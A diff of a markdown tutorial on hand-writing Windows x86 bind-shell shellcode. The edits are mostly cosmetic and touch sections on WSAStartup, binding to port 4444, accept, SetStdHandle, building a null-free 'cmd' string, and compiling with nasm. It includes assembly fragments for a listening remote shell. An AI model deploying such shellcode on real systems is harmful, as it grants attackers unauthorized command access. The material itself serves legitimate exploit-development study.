@@ -116,7 +116,7 @@ This LoadLibraryA() system call is very straight forward. The stack looks like t
 
 ## WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
 
-Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup  
 Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata
 
 The next system call we need to run is WSAStartup() to initialize the use of sockets. It takes two arguments, where the first is the version we are going to use and the second is a pointer to a place to store socket data.
@@ -161,17 +161,17 @@ The pointer to the socket handler will be stored in eax, which we copy into ebx 
 
 ## bind(SOCKET s, const sockaddr *addr, int namelen)
 
-Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind
+Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind  
 Docs: https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2
 
-Next up we need to bind the socket. The first argument is the pointer to the socket handler, which we have stored in ebx. In the second argument, we need to define three things: 
--The port number, which in this case will be 4444 (0x5c11 in hex)
--The address family. For IPv4 it should be set to AF_INET (0x0002 in hex)
--The IP address it will listen on. According to the docs, the INADDR_ANY constant should be used to make it listen on all interfaces. This constant holds the value 0.
+Next up we need to bind the socket. The first argument is the pointer to the socket handler, which we have stored in EBX. In the second argument, we need to define three things: 
++ The port number, which in this case will be 4444 (0x5c11 in hex)
++ The address family. For IPv4 it should be set to AF_INET (0x0002 in hex)
++ The IP address it will listen on. According to the docs, the INADDR_ANY constant should be used to make it listen on all interfaces. This constant holds the value 0.
 
 The third argument is the size of the second argument, which will be 16 bytes (0x10 in hex).
 
-To make the *addr argument more clear, we can look how the second argument would look like in C:
+To make the *addr argument more clear, we can see what it would look like in C:
 ```c
 struct in_addr {
   union {
@@ -202,17 +202,19 @@ server.sin_addr.s_addr = INADDR_ANY;   # 0x00000000
 server.sin_port = htons(4444);         # 0x5c11
 ```
 
-What we need to do is to have a pointer to the following values and have it as the second argument:
+What we need to do is to have a pointer to the following values and pass it as the second argument:
 ```
 5c110002
 00000000
 ```
 
-Notice that there are null bytes in the AF_INET. This can be solved by storing 0x5c110102 in eax and doing `dec ah`, which will only decrement the ah section of eax by one. Explanation:
-eax = 0x5c110102  
-ax = 0x0102 (lowest 16 bits of eax)
-al = 0x02 (lowest 8 bits of ax) 
-ah = 0x01 (highest 8 bits of ax)  
+Notice that there are null bytes in the value for AF_INET. This can be solved by storing 0x5c110102 in EAX and doing `dec ah`, which will only decrement the ah section of EAX by one. 
+
+Explanation:
++ eax = 0x5c110102  
++ ax = 0x0102 (lowest 16 bits of eax)
++ al = 0x02 (lowest 8 bits of ax) 
++ ah = 0x01 (highest 8 bits of ax)  
 
 ```assembly
 xor eax, eax         ; Clear eax
@@ -257,7 +259,7 @@ call eax
 
 Docs: https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept
 
-As the docs says, "The accept function permits an incoming connection attempt on a socket". We need to store the return value here, which gets stored in eax. We store a copy in ebx for later use.
+As the docs says, "The accept function permits an incoming connection attempt on a socket". We need to store the return value here, which gets stored in EAX. We store a copy in EBX for later use.
 
 ```assembly
 xor eax, eax         ; Clear eax
@@ -275,7 +277,7 @@ Now finally we have the socket up and running. Time to implement the shell part.
 
 Docs: https://docs.microsoft.com/en-us/windows/console/setstdhandle
 
-We will use this function to set STD_INPUT, STD_OUTPUT and STD_ERROR to the accepted socket connection.
+We will call this function three times to set STD_INPUT, STD_OUTPUT and STD_ERROR to the accepted socket connection.
 
 ```assembly
 mov edx, 0x7c81d363  ; Address to SetStdHandle()
@@ -320,10 +322,7 @@ ESP -> 0022FE24    5C110002
        0022FE28    00000000
 ```
 
-
-`mov DWORD [esp-0x5], 0x646d6341`
-
-The string "Acmd" is placed 5 bytes from ESP. Since the string only use 3 bytes of the "row" with only zeros, we have a clean null terminated "cmd" string on the stack.
+After `mov DWORD [esp-0x5], 0x646d6341`, the string "Acmd" is placed 5 bytes from ESP. Since the string only use 3 bytes of the "row" with only zeros, we have a clean null terminated "cmd" string on the stack.
 
 ```
        Addr        Value      Ascii
@@ -333,8 +332,7 @@ ESP -> 0022FE24    5C110002
        0022FE28    00000000
 ```
 
-`lea eax, [esp-0x4]`
-Storing a pointer to the "cmd\0" string in EAX.
+`lea eax, [esp-0x4]` stores a pointer to the "cmd\0" string in EAX.
 
 ```
        Addr        Value      Ascii
@@ -344,8 +342,7 @@ ESP -> 0022FE24    5C110002
        0022FE28    00000000
 ```
 
-`lea esp, [esp-0x4]`
-Adjusting ESP, or else data will be overwritten when we push more values on the stack.
+`lea esp, [esp-0x4]` adjusts ESP, or else data will be overwritten when we push more values on the stack.
 
 ```
            Addr        Value      Ascii
@@ -355,8 +352,7 @@ ESP/EAX -> 0022FE20    00646D63   "cmd\0"
            0022FE28    00000000
 ```
 
-`push eax`
-The address of the "cmd\0" string is pushed on the stack and overwrites the previous trash there.
+`push eax` pushes the address of the "cmd\0" string is pushed on the stack and overwrites the previous trash there.
 ```
        Addr        Value      Ascii
 ESP -> 0022FE1C    0022FE20   
@@ -476,8 +472,8 @@ call eax
 
 Time to compile this thing. This can be done on Windows by downloading the following tools: 
 
-*<a href="http://mingw.org/category/wiki/download">ld.exe</a>
-*<a href="https://www.nasm.us/pub/nasm/releasebuilds/">nasm.exe</a>
++<a href="http://mingw.org/category/wiki/download">ld.exe</a>
++<a href="https://www.nasm.us/pub/nasm/releasebuilds/">nasm.exe</a>
 
 ```
 > nasm.exe -f win32 -o bind.obj bind.asm
